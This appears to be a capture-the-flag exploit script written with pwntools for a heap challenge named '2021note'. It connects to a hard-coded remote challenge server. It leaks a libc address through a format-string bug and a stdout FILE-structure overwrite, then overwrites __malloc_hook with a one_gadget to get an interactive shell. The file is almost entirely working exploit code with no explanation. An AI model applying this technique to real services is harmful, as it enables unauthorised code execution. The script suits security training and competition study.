# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './2021note'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '47.104.70.90'
    port = '25315'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size,content):
    cmd(1)
    sla('size:',size)
    sla('content:',content)
    ru('addr: 0x')
    return rint

def say(agr , text):
    cmd(2)
    sa('say ?',agr)
    sla('?',text)

one_gad = one_gadget(libc.path)
heap_addr = add(0x20,'aaa')

payload = p64(0xfbad1800) + p64(0)*3
say('%7$s' , payload)
leak = l64()
_IO_2_1_stdin_ = leak + (0x7f3038ceb8e0 - 0x7f3038cea6e0)

libc.address =_IO_2_1_stdin_ - libc.sym['_IO_2_1_stdin_']
ogg = libc.address + one_gad[1]
__malloc_hook = libc.sym['__malloc_hook'] - 0x8
realloc = libc.sym['realloc']
lg('__malloc_hook',__malloc_hook)

# dbg('__isoc99_scanf')

say('%7$saaaa'  + p64(__malloc_hook), p64(ogg) + p64(realloc + 8) + p64(0))

cmd(1)
# dbg('malloc')
sla('size:',0x20)


p.interactive()

'''
@File    :   2021note.py
@Time    :   2021/08/21 09:57:32
@Author  :   Niyah 
'''